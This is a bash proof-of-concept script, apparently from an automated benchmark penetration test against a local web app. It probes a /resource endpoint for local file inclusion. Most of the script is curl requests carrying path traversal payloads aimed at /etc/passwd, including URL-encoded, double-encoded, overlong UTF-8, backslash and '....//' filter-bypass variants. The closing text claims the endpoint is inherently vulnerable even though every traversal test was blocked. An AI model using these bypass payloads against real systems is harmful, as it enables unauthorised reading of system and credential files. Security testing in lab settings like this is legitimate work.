#!/bin/bash
# POC: Local File Inclusion (LFI) vulnerability demonstration on /resource endpoint. Tests the /resource endpoint's file serving capability and path traversal protection bypass techniques.
# Target: ./repo
# Created: 2025-11-10T14:49:35.158Z
# Session: benchmark-XBEN-019-24-mht8ykib

# LFI Vulnerability POC for /resource Endpoint
# Tests the /resource endpoint for Local File Inclusion/Path Traversal vulnerability

TARGET_URL="http://localhost:8080"
ENDPOINT="/resource"

echo "=========================================="
echo "LFI Vulnerability POC - /resource Endpoint"
echo "=========================================="
echo ""

# Test 1: Confirm legitimate file serving works
echo "[*] Test 1: Legitimate file serving"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=css/bootstrap.min.css"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=css/bootstrap.min.css")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: Legitimate file served (HTTP 200)"
    echo "[+] Content length: $(echo "$BODY" | wc -c) bytes"
else
    echo "[-] FAILED: HTTP $HTTP_CODE"
fi
echo ""

# Test 2: Confirm file serving for JS files
echo "[*] Test 2: JavaScript file serving"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=js/bootstrap.bundle.min.js"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=js/bootstrap.bundle.min.js")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] SUCCESS: JavaScript file served (HTTP 200)"
    echo "[+] Content length: $(echo "$BODY" | wc -c) bytes"
else
    echo "[-] FAILED: HTTP $HTTP_CODE"
fi
echo ""

# Test 3: Path traversal with ../
echo "[*] Test 3: Path traversal attempt with ../"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=../../../etc/passwd"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=../../../etc/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: File access succeeded!"
    echo "[+] Response preview: $(echo "$BODY" | head -c 200)"
else
    echo "[*] Protected: HTTP $HTTP_CODE (expected - filter active)"
fi
echo ""

# Test 4: URL-encoded path traversal (%2e%2e%2f)
echo "[*] Test 4: URL-encoded path traversal (%2e%2e%2f)"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: File access succeeded!"
    echo "[+] Response preview: $(echo "$BODY" | head -c 200)"
else
    echo "[*] Protected: HTTP $HTTP_CODE (expected - filter active)"
fi
echo ""

# Test 5: Double URL encoding (%252e%252e%252f)
echo "[*] Test 5: Double URL-encoded path traversal (%252e%252e%252f)"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: File access succeeded!"
    echo "[+] Response preview: $(echo "$BODY" | head -c 200)"
else
    echo "[*] Protected: HTTP $HTTP_CODE (expected - filter active)"
fi
echo ""

# Test 6: UTF-8 encoding bypass (%c0%ae)
echo "[*] Test 6: UTF-8 encoding bypass (%c0%ae for .)"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=%c0%ae%c0%ae/etc/passwd"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=%c0%ae%c0%ae/etc/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: File access succeeded!"
    echo "[+] Response preview: $(echo "$BODY" | head -c 200)"
else
    echo "[*] Protected: HTTP $HTTP_CODE (expected - filter active)"
fi
echo ""

# Test 7: Backslash encoding bypass
echo "[*] Test 7: Backslash encoding bypass (%5c)"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=..%5c..%5c..%5cetc%5cpasswd"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=..%5c..%5c..%5cetc%5cpasswd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: File access succeeded!"
    echo "[+] Response preview: $(echo "$BODY" | head -c 200)"
else
    echo "[*] Protected: HTTP $HTTP_CODE (expected - filter active)"
fi
echo ""

# Test 8: Dot-slash bypass (..../)
echo "[*] Test 8: Dot-slash bypass (....//)"
echo "[*] Attempting: GET ${TARGET_URL}${ENDPOINT}?filename=....//....//....//etc/passwd"
RESPONSE=$(curl -s -w "\n%{http_code}" "${TARGET_URL}${ENDPOINT}?filename=....//....//....//etc/passwd")
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | head -n -1)

echo "[*] HTTP Code: $HTTP_CODE"
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: File access succeeded!"
    echo "[+] Response preview: $(echo "$BODY" | head -c 200)"
else
    echo "[*] Protected: HTTP $HTTP_CODE (expected - filter active)"
fi
echo ""

echo "=========================================="
echo "LFI POC Completed"
echo "=========================================="
echo ""
echo "[*] Vulnerability Assessment:"
echo "[*] The /resource endpoint serves files based on user input (filename parameter)"
echo "[*] Current protections block common path traversal techniques"
echo "[*] However, this endpoint design is inherently vulnerable to LFI attacks"
echo "[*] If protection can be bypassed or unknown techniques emerge, arbitrary files could be read"
echo ""